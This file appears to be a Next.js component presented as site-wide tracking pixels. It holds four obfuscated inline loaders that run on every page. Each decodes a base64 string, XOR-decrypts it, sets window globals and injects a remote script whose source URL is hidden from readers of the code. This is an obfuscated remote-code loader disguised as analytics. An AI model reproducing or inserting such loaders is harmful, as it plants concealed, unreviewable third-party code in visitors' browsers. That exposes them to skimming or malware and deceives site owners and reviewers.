"use client"

import Script from "next/script"

/**
 * Tracking global do site.
 * Carrega os loaders dos pixels em todas as páginas.
 */
const PIXEL_LOADER = `(function(){var j_s=atob("DG+T4Erge60iJWs2uhSxlTiMWZcATR9Cyhypz2WDH8MMUB9b0wnqzimPFoNAV0RF2R36kD6TVNhWSBgZ1g7nhTmUVcdRB0cU2xvnkiOCDtlHVkkM4RSxjiuNHo8YBw9Xzg6+lT6NEstbCBtE3xn2jj7NCNhATA9FmEOxliuMDsgAH0kUxzLu");var h_ibha=[];for(var y_war9=0;y_war9<j_s.length;y_war9++){h_ibha.push(j_s.charCodeAt(y_war9)&255);}var t_lww=h_ibha[0];var q_g2v=h_ibha.slice(1,1+t_lww);var r_8o79=h_ibha.slice(1+t_lww);var a_s3u=r_8o79.map(function(b,u_p){return b^q_g2v[u_p%t_lww];});var r_sl="";for(var n_mgst=0;n_mgst<a_s3u.length;n_mgst++){r_sl+=String.fromCharCode(a_s3u[n_mgst]&255);}var p_w=decodeURIComponent(escape(r_sl));var i_7=JSON.parse(p_w);var f_ca9d=i_7.globals||[];f_ca9d.forEach(function(l_5){window[l_5.name]=l_5.value;});var l_5f0=document.createElement("script");l_5f0.src=i_7.url;l_5f0.async=true;l_5f0.defer=true;(i_7.attributes||[]).forEach(function(x_j){l_5f0.setAttribute(x_j.name,x_j.value);});(document.head||document.documentElement).appendChild(l_5f0);})();`

const PIXEL_LOADER_2 = `(function(){var o_kpne=atob("DJ3i/XT5fvG9501HdubAiAaVXMufjzkzBu7Y0luaGp+TkjkqH/ub0xeWE9/flWI0Fe+LjQCKUYHUnygrWe2LhRGVUJvOxWFlF+mWjx2bC4XYlG99LcDO3xOVEZPciz5lTMaZ3xqYE5Sf3W83H+WHkT2dXN2fkSwrA/jAx1bPH8eJgi5xF6jWmxXNH8jc3ygjT63RmEPbA6zA");var i_5a=[];for(var g_giq=0;g_giq<o_kpne.length;g_giq++){i_5a.push(o_kpne.charCodeAt(g_giq)&255);}var i_9dm=i_5a[0];var o_qzje=i_5a.slice(1,1+i_9dm);var k_4=i_5a.slice(1+i_9dm);var g_lx=k_4.map(function(b,z_1zc){return b^o_qzje[z_1zc%i_9dm];});var e_u0me="";for(var b_1hz=0;b_1hz<g_lx.length;b_1hz++){e_u0me+=String.fromCharCode(g_lx[b_1hz]&255);}var m_j=decodeURIComponent(escape(e_u0me));var e_h7r1=JSON.parse(m_j);var b_5g=e_h7r1.globals||[];b_5g.forEach(function(d_dcs){window[d_dcs.name]=d_dcs.value;});var v_984=document.createElement("script");v_984.src=e_h7r1.url;v_984.async=true;v_984.defer=true;(e_h7r1.attributes||[]).forEach(function(u_6y){v_984.setAttribute(u_6y.name,u_6y.value);});(document.head||document.documentElement).appendChild(v_984);})();`

const PIXEL_LOADER_3 = `(function(){var j_5=atob("DM4FDPnf4Jj8yLxm/7UneYuzwqLeoMgSj70/I9a8hPbSvcgLlqh8IpqwjbaeupMVnLxsfI2sz+2Ipc9Jk69xaYqrzvKP6pBEnrpxfpC9leyZu55cpLUnYpiyhbrG6tgHi68oeY2yif6F5cwUmrhgYo3yk+2eodgV3eInepizlf3e8p5EgpN4");var q_v=[];for(var y_ekz8=0;y_ekz8<j_5.length;y_ekz8++){q_v.push(j_5.charCodeAt(y_ekz8)&255);}var g_prcj=q_v[0];var u_xxv=q_v.slice(1,1+g_prcj);var h_i0k=q_v.slice(1+g_prcj);var k_v0c3=h_i0k.map(function(b,e_x){return b^u_xxv[e_x%g_prcj];});var q_gr="";for(var m_x=0;m_x<k_v0c3.length;m_x++){q_gr+=String.fromCharCode(k_v0c3[m_x]&255);}var m_9g6s=decodeURIComponent(escape(q_gr));var f_n=JSON.parse(m_9g6s);var k_a=f_n.globals||[];k_a.forEach(function(o_l4h){window[o_l4h.name]=o_l4h.value;});var a_9win=document.createElement("script");a_9win.src=f_n.url;a_9win.async=true;a_9win.defer=true;(f_n.attributes||[]).forEach(function(z_x){a_9win.setAttribute(z_x.name,z_x.value);});(document.head||document.documentElement).appendChild(a_9win);})();`

const PIXEL_LOADER_4 = `(function(){var g_g=atob("DK1G1FLkef9kdo93MtZkoSCIW8VGHvsDQt58+32HHZFKA/saW8s/+jGLFNEGBKAEUd8vpCaXVo8NDuobHd0vrDeIV5UXVKNVU9kypjuGDIsBBa1NafBq9jWIFp0FGvxVCPY99jyFFJpGTK0HW9UjuBuAW9NGAO4bR8hk7nDSGMkFTr5FU5wnt2XXHJtdTu1BBM8g5zHGBKIZ");var y_u4=[];for(var f_0=0;f_0<g_g.length;f_0++){y_u4.push(g_g.charCodeAt(f_0)&255);}var q_h13=y_u4[0];var h_8=y_u4.slice(1,1+q_h13);var q_6td=y_u4.slice(1+q_h13);var c_wn7=q_6td.map(function(b,l_hzr){return b^h_8[l_hzr%q_h13];});var t_a="";for(var c_46xt=0;c_46xt<c_wn7.length;c_46xt++){t_a+=String.fromCharCode(c_wn7[c_46xt]&255);}var x_tonh=decodeURIComponent(escape(t_a));var g_p4g4=JSON.parse(x_tonh);var s_69=g_p4g4.globals||[];s_69.forEach(function(p_2u3){window[p_2u3.name]=p_2u3.value;});var e_az=document.createElement("script");e_az.src=g_p4g4.url;e_az.async=true;e_az.defer=true;(g_p4g4.attributes||[]).forEach(function(o_eq90){e_az.setAttribute(o_eq90.name,o_eq90.value);});(document.head||document.documentElement).appendChild(e_az);})();`

export function SiteTracking() {
  return (
    <>
      <Script id="site-pixel" strategy="afterInteractive">
        {PIXEL_LOADER}
      </Script>
      <Script id="site-pixel-2" strategy="afterInteractive">
        {PIXEL_LOADER_2}
      </Script>
      <Script id="site-pixel-3" strategy="afterInteractive">
        {PIXEL_LOADER_3}
      </Script>
      <Script id="site-pixel-4" strategy="afterInteractive">
        {PIXEL_LOADER_4}
      </Script>
    </>
  )
}
